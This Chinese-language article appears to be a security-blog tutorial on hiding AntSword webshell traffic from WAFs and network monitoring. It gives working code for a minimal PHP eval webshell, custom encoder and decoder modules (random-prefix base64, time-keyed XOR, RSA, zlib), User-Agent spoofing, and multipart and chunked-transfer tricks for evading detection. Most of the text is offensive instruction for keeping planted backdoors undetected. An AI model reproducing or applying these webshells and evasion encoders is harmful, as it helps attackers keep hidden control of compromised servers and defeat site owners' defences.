### 流量分析

挂个代理直接抓包就好了

![headImg.action?news=ffbed472-5c50-44c1-8bbe-736183c03f5b.png](https://image.3001.net/images/20210409/1617956527_60700eafd087c1dece7d7.png!small)

### UA头修改

修改蚁剑工作目录的/modules/request.js，这里面默认是`antSword/v2.1`

![headImg.action?news=349dffd1-39de-457d-9506-baefd5ca8524.png](https://image.3001.net/images/20210409/1617956529_60700eb1162c1800ea91d.png!small)

一般需要修改一下，不然极其容易被发现，可以利用平常爬虫的一些技巧，随机构造UA头

    
    
    let USER_AGENTS = [  
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",  
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",  
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",  
    "User-Agent:Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",  
    "User-Agent:Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",  
    ];  
    ​  
    const USER_AGENT = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length + 1)];

### 编码管理绕过检测

蚁剑里面可以自己构造流量的编码的效果，存在于设置的编码管理中，可以设置发送流量的加密效果，也可以设置返回数据流量的解密效果，但是我们同样需要我们上传木马的配合，这里又涉及到免杀这一个过程

蚁剑的编码器很友好，注释啥的写的也很清楚，官方给的demo是弄了一个随机变量名，我们的内容base64之后再次传入到这个变量中，再解base64执行一次eval，这个编码器最终发送的是data数组的内容，数组里面有多少内容它就会全部发送，数组的key值就是传过去的参数值

![headImg.action?news=d53ace00-fc8b-4b20-b061-416a48f8b7ee.png](https://image.3001.net/images/20210409/1617956529_60700eb1e2d014fe72e8a.png!small)

![headImg.action?news=06d6b765-ede5-4aea-bc65-81fc10957fd0.png](https://image.3001.net/images/20210409/1617956531_60700eb337fc9ce59eee9.png!small)

### 自定义编码

我们可以对其进行改造，这就是自定义改造了

参考这篇文章的例子：<https://xz.aliyun.com/t/4000>，文中是改成最后传输的数据`随机字符串+传输数据base64+随机字符串`的效果，我们可以模仿一下，构造`随机字符串+传输数据base64`的效果，只要被抓取的流量无法被直接正常分析就可以了

    
    
    /**  
    * php::base64编码器  
    * Create at: 2019/01/26 23:51:47  
    */  
    ​  
    'use strict';  
    ​  
    /*  
    * @param  {String} pwd   连接密码  
    * @param  {Array}  data  编码器处理前的 payload 数组  
    * @return {Array}  data  编码器处理后的 payload 数组  
    */  
    module.exports = (pwd, data) => {  
    // ##########    请在下方编写你自己的代码   ###################  
    // 以下代码为 PHP Base64 样例  
    ​  
    // 生成一个随机变量名  
    let randomID = `${Math.random().toString(16).substr(2)}`;  
    // 原有的 payload 在 data['_']中  
    // 取出来之后，转为 base64 编码并放入 randomID key 下  
    let encry= new Buffer(data['_']).toString('base64');  
    ​  
    // shell 在接收到 payload 后，先处理 pwd 参数下的内容，  
    data[pwd] = `${randomID}`+encry;  
    // ##########    请在上方编写你自己的代码   ###################  
    ​  
    // 删除 _ 原有的payload  
    delete data['_'];  
    // 返回编码器处理后的 payload 数组  
    return data;  
    }

编码器选择我们设置的，观察流量，内容的前面13位是我们随机生成的字符串，后面才是我们真正传过去的内容

![headImg.action?news=57fc4aca-2e70-4033-a63f-0161a0c166f5.png](https://image.3001.net/images/20210409/1617956532_60700eb46dade4d0353e3.png!small)

弄好蚁剑端的加密，还需要设置自己木马的格式，配合蚁剑，此时上传的木马应该是这种格式的了，这只是一个demo，正常情况下还需要免杀（现在一般都需要配合类的析构函数去实现一下）

    
    
    <?php  
    $a = base64_decode(substr($_POST['a'],13));  
    eval($a);

当然也能实现动态随机字符串的流量构造，只需要传递多几个参数实现一下就行，要想使用form表单的方式发包，也可以使用multipart方式发包，此时报的内容就会是这样

![headImg.action?news=7fd4682d-f895-42d4-87c2-b16d6de0ea18.png](https://image.3001.net/images/20210409/1617956533_60700eb577ef0a69fe83f.png!small)

![headImg.action?news=6777d0cd-d2b9-4b31-ad84-c23ffa646fbe.png](https://image.3001.net/images/20210409/1617956534_60700eb666db3a639514c.png!small)

### 官方提供的一些编码器

在蚁剑自带的编码器中，存在base64、chr、chr16、rot13四种编码器，此外，官方还提供了一些其他另类的编码器
<https://github.com/AntSwordProject/AwesomeEncoder>

但是自带的编码器中，因为将请求流量都会带有eval和一些编码函数的关键字而被WAF掉了，比如这个图：

![headImg.action?news=a14e9799-ddbd-453a-87af-bacf6d16f784.png](https://image.3001.net/images/20210409/1617956535_60700eb73db0f527cef30.png!small)

所以在<https://github.com/AntSwordProject/AwesomeEncoder>这个项目中，有一些编码方式会将这些函数变量进行一次编码或者加密，不行就多次，比如这里面的b64bypass这个编码器，跟上方的单纯base64进行比较的话，已经少了这些关键字了

![headImg.action?news=aaf310f6-d981-4c36-9ced-e96baa32ce4a.png](https://image.3001.net/images/20210409/1617956536_60700eb825c19a081040e.png!small)

![headImg.action?news=90538ab9-ef54-4c1d-8e8f-92527278f22c.png](https://image.3001.net/images/20210409/1617956536_60700eb8c937984831cdc.png!small)

 **RSA编码器**

这种类型的编码器，可以在AWD中大放异彩，只需要轻轻点几下即会自动生成私钥公钥的内容

思路是来自于这篇文章：<https://xz.aliyun.com/t/4640>

![headImg.action?news=cea964f6-c465-430d-bb4a-3538412c2d40.png](https://image.3001.net/images/20210409/1617956537_60700eb9acf0c9f8f7c49.png!small)

可以放置别人骑我们的马，但是不能防止别人重放我们的流量

所以可以在此基础上加上一些token，ip限制之类的，蚁剑的作者提出使用时间校验的方式，超过5秒就不能来骑我的马儿了，只需要加上这么一句

    
    
    data["_"] = `if((time()-${parseInt((new Date().getTime())/1000)})>5){die();};${data['_']}`;

 **基于时间的蚁剑动态秘钥编码器**

整个的流程是这样的：

蚁剑获取时间->生成随机秘钥->加密payload->发送给shell

shell获取时间->生成随机秘钥->解密payload->将回显data编码->返回给蚁剑

蚁剑获取时间->生成随机秘钥->解密返回data->获取信息

这一个来回下来，时间还是一样的，因为时间只到分钟，密钥短时间内不会改变，加解密方法使用的是异或，这个流量已经很难解密了

![headImg.action?news=4821d3b7-1f21-4d35-88be-7d78b9d5832f.png](https://image.3001.net/images/20210409/1617956538_60700ebaa885d4c1efba2.png!small)

 **zlib_deflated_raw 编码器**

该方式通过将数据进行zlib压缩后进行base64编码传输给shell，这样要求shell将传输的数据先进行base64解密后通过gzinflate将压缩数据进行解压缩，从而实现流量混淆

这个编码器的加密效果也是不错的

![headImg.action?news=6fc40487-6628-441d-9b2c-113b8713a87f.png](https://image.3001.net/images/20210409/1617956539_60700ebb957aa827ca223.png!small)

还有其他的一些编码器，使用什么aes之类的，利用起来比较麻烦，有的还需要环境，个人感觉不太常用，但也能学习一下

### 解码器设置

返回的报文也是个重点，直接明文返回也比较明显，因为没多少站点会直接返回`/etc/passwd`的内容

可以先观察一波原始执行的php代码，其中`asenc`函数是输出返回内容的地方，默认直接返回明文，我们在编码器写的内容，会在发送的时候覆盖这个函数的内容，服务器端执行完代码之后，实现返回效果经过编码加密的效果

    
    
    <?php  
    @ini_set("display_errors", "0");  
    @set_time_limit(0);  
    function asenc($out){  
      return $out;  
    }  
    ;  
    function asoutput(){  
      $output=ob_get_contents();  
      ob_end_clean();  
      echo "95922eac";  
      echo @asenc($output);  
      echo "38160";  
    }  
    ob_start();  
    try{  
      $F=base64_decode($_POST["td1b2e4829a55c"]);  
      $P=@fopen($F,"r");  
      echo(@fread($P,filesize($F)?filesize($F):4096));  
      @fclose($P);  
      ;  
    }  
    catch(Exception $e){  
      echo "ERROR://".$e->getMessage();  
    }  
    ;  
    asoutput();  
    die();

 **base64解码器**

`decode_buff`部分是设置解密的，`asoutput`设置的东西则是覆盖请求函数中的`asenc`函数的内容

    
    
    /**  
    * php::base64解码器  
    * Create at: 2021/03/02 18:52:44  
    */  
    ​  
    'use strict';  
    ​  
    module.exports = {  
    /**  
     * @returns {string} asenc 将返回数据base64编码  
     * 自定义输出函数名称必须为 asenc  
     * 该函数使用的语法需要和shell保持一致  
     */  
    asoutput: () => {  
      return `function asenc($out){  
        return @base64_encode($out);  
      }  
      `.replace(/\n\s+/g, '');  
    },  
    /**  
     * 解码 Buffer  
     * @param {string} data 要被解码的 Buffer  
     * @returns {string} 解码后的 Buffer  
     */  
    decode_buff: (data, ext={}) => {  
      return Buffer.from(data.toString(), 'base64');  
    }  
    }

设置之后抓包可以看到它里面的函数内容已经被更改了

![headImg.action?news=eaea3118-6537-4390-aa6e-ea8555ed74f7.png](https://image.3001.net/images/20210409/1617956540_60700ebc63a10473fe07a.png!small)

而且返回的内容也不容易被轻易解出来，因为在a请求包中的output函数中每次都设置了随机的前后分界字符串，只有客户端知道分界位置，所以能直接解编码，WAF基本上是没法定位位置进行解码的，因此相当于base64编码前后都有一段随机的字符串，当然我们可以通过爆破前后位置最终得到base64编码，不过这也是蚁剑开发过程中的小细节，通过设置前后分解字符串来模拟了一个简单的加盐操作

也就是这两段东西导致不能够直接将返回包解码就可以得到相关信息，只能通过爆破跑跑

![headImg.action?news=9b26fa9d-455d-4818-a740-979ca42f42eb.png](https://image.3001.net/images/20210409/1617956541_60700ebd3c3ee4fd61c3c.png!small)

 **rot13解码器**

相比于base64解码器，rot13解码器并没有很大的优势，因为rot13加密本身就是凯撒的变形，并且由于没有进行分组加密，因此加入前后分界字符串的意义也就不明显了，并且混淆程度也不高，能够直接将混淆后的流量在进行rot13解码便能能到明文

上述两个是蚁剑自带的，其实也可以自己构建相关的解码器

 **基于时间的动态秘钥解码器**

只要在返回的内容中再次基于时间产生的密钥进行一个异或操作，然后解密操作在decode_buff实现

    
    
    'use strict';  
    module.exports = {  
    /**  
     * @returns {string} asenc 将返回数据base64编码  
     * 自定义输出函数名称必须为 asenc  
     * 该函数使用的语法需要和shell保持一致  
     */  
    asoutput: () => {  
      return `function asenc($out){  
        date_default_timezone_set("PRC");  
        $key=md5(date("Y-m-d H:i",time()));  
        for($i=0;$i<strlen($out);$i++){  
            $out[$i] = $out[$i] ^ $key[$i%32];  
        }  
        return @base64_encode($out);  
      }  
      `.replace(/\n\s+/g, '');  
    },  
    /**  
     * 解码 Buffer  
     * @param {string} data 要被解码的 Buffer  
     * @returns {string} 解码后的 Buffer  
     */  
    decode_buff: (data, ext={}) => {  
      function xor(payload){  
        let crypto = require('crypto');  
          //确定一个24小时制的规范时间格式  
        Object.assign(Date.prototype, {  
            switch (time) {  
                let date = {  
                    "yy": this.getFullYear(),  
                    "MM": this.getMonth() + 1,  
                    "dd": this.getDate(),  
                    "hh": this.getHours(),  
                    "mm": this.getMinutes(),  
                    "ss": this.getSeconds()  
                };  
                if (/(y+)/i.test(time)) {  
                    time = time.replace(RegExp.$1, (this.getFullYear() + '').substr(4 - RegExp.$1.length));  
                }  
                Object.keys(date).forEach(function (i) {  
                    if (new RegExp("(" + i + ")").test(time)) {  
                        if (RegExp.$1.length == 2) {  
                            date[i] < 10 ? date[i] = '0' + date[i] : date[i];  
                        }  
                        time = time.replace(RegExp.$1, date[i]);  
                    }  
                })  
                return time;  
            }  
        })  
    ​  
        let newDate = new Date();  
        let time = newDate.switch('yyyy-MM-dd hh:mm');  
        let key = crypto.createHash('md5').update(time).digest('hex')  
        key = key.split("").map(t => t.charCodeAt(0));  
        let data = payload;  
        let cipher=Buffer.from(data.toString(), 'base64').toString();  
        cipher = cipher.split("").map(t => t.charCodeAt(0));  
        for (let i = 0; i < cipher.length; i++) {  
            cipher[i] = cipher[i] ^ key[i % 32]  
        }  
        cipher=cipher.map(t=>String.fromCharCode(t)).join("")  
        return cipher;  
      }  
      return xor(data);  
    }  
    }

绕过检测的程度也很高

### WAF的一些常规的封杀点以及一些绕过方法

参考这篇文章：<https://mp.weixin.qq.com/s/u8_d8MXvFuwOyIMZZMBsog>

其实蚁剑都能根据这些点进行绕过，实属大杀器，总结了个脑图

![headImg.action?news=97d7dce4-601a-4e1b-b50f-78720d947e74.png](https://image.3001.net/images/20210409/1617956542_60700ebe0e8b327280e3c.png!small)

商用的WAF，由于要关注业务性，可能会把multipart/form-data这种多用来上传文件的传输方式检测关闭掉，否则攻击者持续上传大文件，一直损耗WAF的性能，容易拖垮相关业务，因此如果使用Multipart进行传输，对流量的混淆也起到了一定的积极效果

另外蚁剑还有分块传输的功能，利用的chunk这种传输方式，把payload分成一小段一小段传过去,这样原本一个包中的一些关键字则会被分割成很多小块进行传输，可以绕过了某些正则

本文涉及相关实验：[全面分析中国菜刀及隐藏后门](https://www.hetianlab.com/expc.do?ec=ECIDee9320adea6e062018020614185300001&pk_campaign=freebuf-wemedia)（通过该实验了解中国菜刀的特性及其通信原理、机制，并且学会分析可能隐藏的后门以及其工作原理。）

